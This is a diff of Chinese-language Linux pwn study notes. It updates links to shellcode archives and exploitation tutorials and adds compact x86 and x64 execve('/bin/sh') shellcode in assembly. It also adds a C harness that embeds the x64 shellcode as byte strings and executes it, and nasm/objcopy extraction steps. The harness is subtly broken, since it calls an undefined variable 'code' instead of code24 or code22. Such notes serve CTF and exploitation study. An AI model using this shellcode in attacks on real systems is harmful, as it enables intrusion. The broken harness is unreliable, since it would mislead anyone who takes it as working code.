@@ -3,9 +3,8 @@
 http://shell-storm.org
 http://shell-storm.org/shellcode/
 https://www.exploit-db.com
-https://www.exploit-db.com/shellcode/
+https://www.exploit-db.com/shellcodes/
 [linux pwn 入门教程 i春秋](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)
-[DynELF](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=42933&ctid=157)
 [格式化字符串](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=43624&ctid=157)
 [调整栈帧的技巧](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=42534&ctid=157)
 [PIE无关](https://bbs.ichunqiu.com/thread-43627-1-1.html)
@@ -56,7 +55,7 @@ plt 指向got,采用延时绑定。printf函数中，0x404c010实际内容是下
 而plt.got是已经绑定的， puts函数的0x804bff4是指向实际puts函数的
 
 ## shellcode
-
+### x86 
 ```x86asm
 jmp sh
 run:
@@ -71,7 +70,65 @@ sh:
   call run
   db "/bin/sh"
 ```
+20bytes:
+```x86asm
+  xor ecx,ecx 
+  cdq
+  push ecx 
+  push 0x68732f2f 
+  push 0x6e69622f 
+  mov ebx,esp 
+  mov al,0xb 
+  int 0x80
+```
+### x64
+24bytes:
+```x64asm 
+global _start
+section .text
+_start:
+	push 59
+	pop rax
+	cdq
+	push rdx
+	mov rbx,0x68732f6e69622f2f
+	push rbx
+	push rsp
+	pop rdi
+	push rdx
+	push rdi
+	push rsp
+	pop rsi
+	syscall
+```
+22bytes:
+```x64asm
+	push 59
+	pop rax
+	cdq
+	push rdx
+	mov rbx,0x68732f6e69622f2f
+	push rbx
+	push rsp
+	pop rdi
+  push rdx
+	pop rsi
+	syscall
+```
 
+```c
+#include <stdio.h>
+#include <string.h>
+char code24[] = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05";
+char code22[] = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x5e\x0f\x05";
+int main()
+{
+    printf("len:%d bytes\n", strlen(code24));
+    (*(void(*)()) code)();
+    return 0;
+}
+```
+### 制作方法
 linux 下
 - 使用`nasm [sourcecode] -o [target] -felf32`编译一个汇编文件 
 - 使用`objcopy -O binary [source.out] [target]`提取 shellcode的。
